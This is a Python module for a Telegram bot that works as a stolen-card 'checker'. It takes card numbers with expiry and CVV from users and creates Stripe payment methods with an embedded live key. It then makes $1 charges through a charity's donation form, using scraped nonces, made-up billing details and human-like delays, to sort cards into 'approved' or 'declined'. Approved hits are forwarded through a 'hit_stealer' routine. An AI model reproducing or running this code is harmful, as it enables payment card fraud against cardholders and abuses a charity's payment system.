import re
import time
import logging
import requests
import random
import string
import asyncio
import traceback  # Added: For error logging
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved
async def stripe_charge(card):
    n, mm, yy, cvc = card.split("|")
    yy = yy[-2:]  # Last two digits of year

    def sync_stripe():
        r = requests.Session()
        user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        r.headers.update({'user-agent': user_agent})

        # Helper: Retry wrapper for requests
        def make_request_with_retry(method, url, **kwargs):
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    if method == 'get':
                        resp = r.get(url, **kwargs)
                    elif method == 'post':
                        resp = r.post(url, **kwargs)
                    resp.raise_for_status()  # Raise on HTTP errors
                    return resp
                except requests.exceptions.Timeout:
                    logging.warning(f"Request timeout on attempt {attempt + 1}/{max_retries} for {url}")
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)  # Exponential backoff: 1s, 2s, 4s
                    else:
                        raise  # Final failure
                except requests.exceptions.RequestException as e:
                    logging.error(f"Request failed on attempt {attempt + 1}: {e}")
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)
                    else:
                        raise
            return None  # Should not reach here

        # Get nonce with retries and increased timeout
        try:
            time.sleep(random.uniform(0.5, 1.5))  # Random delay to mimic human
            res = make_request_with_retry('get', 'https://needhelped.com/campaigns/poor-children-donation-4/donate', timeout=15)
            if not res:
                return {'status':'DECLINED❌', 'text':'Nonce retrieval failed after retries (network issue)', 'bin': n[:6]}
            
            m = re.search(r'<input[^>]*name=["\']_charitable_donation_nonce["\'][^>]*value=["\']([^"\']+)["\']', res.text, re.I)
            if not m:
                logging.warning("Nonce not found in page HTML")
                return {'status':'DECLINED❌', 'text':'Cannot get nonce (page changed?)', 'bin': n[:6]}
            nonce = m.group(1)
            logging.info(f"Nonce retrieved successfully: {nonce[:10]}...")
        except Exception as e:
            logging.error(f"Nonce retrieval failed: {e}")
            return {'status':'DECLINED❌', 'text':'Cannot get nonce (connection error)', 'bin': n[:6]}

        # Create PaymentMethod (use 4-digit year for safety) - Keep original timeout
        full_year = f"20{yy}"  # e.g., '26' -> '2026'
        headers_pm = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent
        }
        data_pm = (f'type=card&billing_details[name]=Ali&billing_details[email]='
                   f'karmnil5556805%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}'
                   f'&card[exp_year]={full_year}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr')
        
        try:
            time.sleep(random.uniform(0.5, 1.0))  # Short delay
            resp_pm = make_request_with_retry('post', 'https://api.stripe.com/v1/payment_methods', headers=headers_pm, data=data_pm, timeout=10)
            if not resp_pm:
                return {'status':'DECLINED❌', 'text':'PaymentMethod request failed after retries', 'bin': n[:6]}
            
            pm_json = resp_pm.json()
            logging.info(f"Stripe PaymentMethod Response: {pm_json}")
            pm_id = pm_json.get('id')
            if not pm_id:
                error_msg = pm_json.get('error', {}).get('message', 'PM creation failed')
                return {'status':'DECLINED❌', 'text': error_msg, 'bin': n[:6]}
        except Exception as e:
            logging.error(f"PaymentMethod creation failed: {e}")
            return {'status':'DECLINED❌', 'text':'Payment method creation failed', 'bin': n[:6]}

        # Make Donation (Charge) - Use retries here too
        headers_ajax = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://needhelped.com',
            'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }
        data_ajax = {
            'charitable_form_id': '68b897e371712',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
            'campaign_id': '1164',
            'description': 'Poor Children Donation Support',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Ali',
            'last_name': 'Karar',
            'email': 'karmnil5556805@gmail.com',
            'address': '4003 Gershwin Ave',  # Plausible NY address
            'city': 'New York',  # Valid for ZIP 10080
            'state': 'NY',  # Matches ZIP
            'postcode': '10080',
            'country': 'US',
            'phone': '1 504-843-4807',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        try:
            time.sleep(random.uniform(0.5, 1.0))  # Short delay
            resp_ajax = make_request_with_retry('post', 'https://needhelped.com/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, timeout=10)
            if not resp_ajax:
                return {'status':'DECLINED❌', 'text':'Charge request failed after retries', 'bin': n[:6]}
            
            logging.info(f"Charge Response - Status: {resp_ajax.status_code}, Headers: {dict(resp_ajax.headers)}, Body: {resp_ajax.text[:500]}...")  # Debug raw response
            
            # Handle non-200 status
            if resp_ajax.status_code != 200:
                return {'status':'DECLINED❌', 'text': f'Server error: HTTP {resp_ajax.status_code}', 'bin': n[:6]}
            
            # Handle JSON decode
            try:
                resp_json = resp_ajax.json()
                logging.info(f"Donation Charge Response: {resp_json}")
            except ValueError as json_err:
                logging.error(f"JSON decode failed: {json_err}. Raw response: {resp_ajax.text}")
                # Check for error keywords in text response
                if 'error' in resp_ajax.text.lower() or 'invalid' in resp_ajax.text.lower() or 'decline' in resp_ajax.text.lower():
                    return {'status':'DECLINED❌', 'text': 'Server validation error (e.g., address/card mismatch)', 'bin': n[:6]}
                return {'status':'DECLINED❌', 'text': 'Invalid server response (non-JSON)', 'bin': n[:6]}

            if resp_json.get('success') == True or 'Thank you for your donation' in str(resp_json):
                return {'status':'APPROVED✅', 'text':'Charge 1$ ✅', 'bin': n[:6]}
            else:
                err = resp_json.get('errors', [{}])[0] if 'errors' in resp_json else resp_json.get('message', 'Declined')
                return {'status':'DECLINED❌', 'text': str(err), 'bin': n[:6]}
        except requests.RequestException as e:
            logging.error(f"Charge request failed: {e}")
            return {'status':'DECLINED❌', 'text':'Network/Request error', 'bin': n[:6]}

    return await asyncio.to_thread(sync_stripe)

@Client.on_message(filters.command("auth", [".", "/"]))  # Assuming this is the command; adjust if it's "stripe"
async def stripe_cmd(Client, message):
    user_id = str(message.from_user.id)
    try:
        checkall = await check_all_thing(Client, message)
        gateway = "Stripe Gate 💎"
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc is False:
            resp = (f"<b>Gate Name: {gateway} ♻️\nCMD: /auth\n\n"
                    "Message: No CC Found in your input ❌\nUsage: /auth cc|mes|ano|cvv</b>")
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        bin6 = cc[:6]

        firstresp = (f"↯ Checking.\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>\n"
                     f"- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□\n")
        firstchk = await message.reply_text(firstresp, message.id)
        await asyncio.sleep(0.5)

        secondresp = (f"↯ Checking..\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>\n"
                      f"- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□\n")
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
        await asyncio.sleep(0.5)

        start_time = time.perf_counter()
        result = await stripe_charge(fullcc)  # This should now work

        getbin = await get_bin_details(cc)

        thirdresp = (f"↯ Checking...\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>\n"
                     f"- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■\n")
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
        await asyncio.sleep(0.5)

        brand, type_, level, bank, country, flag, currency = ("Unknown",)*7
        if len(getbin) > 0: brand = getbin[0]
        if len(getbin) > 1: type_ = getbin[1]
        if len(getbin) > 2: level = getbin[2]
        if len(getbin) > 3: bank = getbin[3]
        if len(getbin) > 4: country = getbin[4]
        if len(getbin) > 5: flag = getbin[5]
        if len(getbin) > 6: currency = getbin[6]

        vbv_status = "Not Found"
        try:
            with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
                vbv_data = file.readlines()
            found_bin = False
            for line in vbv_data:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if parts[0] == bin6:
                    found_bin = True
                    vbv_status = parts[2] if len(parts) > 2 else parts[1]
                    break
            if not found_bin:
                vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
        except FileNotFoundError:
            vbv_status = "VBV BIN file missing"

        proxy_status = "No Proxy"

        finalresp = (f"{result['status']}\n━━━━━━━━━━━━━\n"
                     f"[ϟ] 𝗖𝗖 - <code>{fullcc}</code>\n"
                     f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {result['text']}\n"
                     f"[ϟ] 𝗚𝗮𝘁𝗲 - {gateway}\n━━━━━━━━━━━━━\n━━━━━━━━━━━━━\n"
                     f"[ϟ] B𝗶𝗻 : {bin6}\n"
                     f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}\n"
                     f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}\n"
                     f"[ϟ] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}\n━━━━━━━━━━━━━\n"
                     f"[ϟ] T/t : {time.perf_counter() - start_time:0.2f}s | Proxy : {proxy_status}\n"
                     f"[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]\n"
                     f"[ϟ] 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=6622603977'>𝑵𝒂𝒊𝒓𝒐𝒃𝒊𝒂𝒏𝒈𝒐𝒐𝒏</a>\n"
                     f"╚━━━━━━「𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑」━━━━━━╝")
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)

        if result['status'] == "APPROVED":
            await send_hit_if_approved(Client, finalresp)

        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception as e:  # Fixed: Use 'as e' for better logging
        logging.error(f"[stripe_cmd ERROR] {traceback.format_exc()}")
        await message.reply_text("An error occurred while processing your request. Please try again later.", quote=True)
